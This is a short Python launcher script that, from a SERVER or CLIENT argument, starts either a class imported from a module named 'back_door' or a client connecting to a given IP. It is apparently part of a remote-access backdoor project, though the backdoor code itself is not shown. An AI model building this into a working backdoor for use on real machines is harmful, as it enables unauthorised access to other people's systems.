from client import Client
from back_door import BackDoor
import sys
from typing import Union


def shutdown():
    print("You must specify one argument -> CLIENT or SERVER")
    sys.exit()


def process_arg(arg) -> Union[bool, str]:
    if not arg or len(arg) > 2:
        shutdown()
    elif arg[0] == "SERVER":
        return False
    elif arg[0] == "CLIENT":
        try:
            ip = arg[1]
        except:
            sys.exit("Must specify IP")
        return ip
    else:
        shutdown()


def run_server() -> None:
    b = BackDoor()
    b.start()


def run_client(ip: str) -> None:
    c = Client(ip)
    c.start()


def main() -> None:
    ip = process_arg(sys.argv[1:])
    if ip:
        run_client(ip)
    else:
        run_server()


if __name__ == "__main__":
    main()
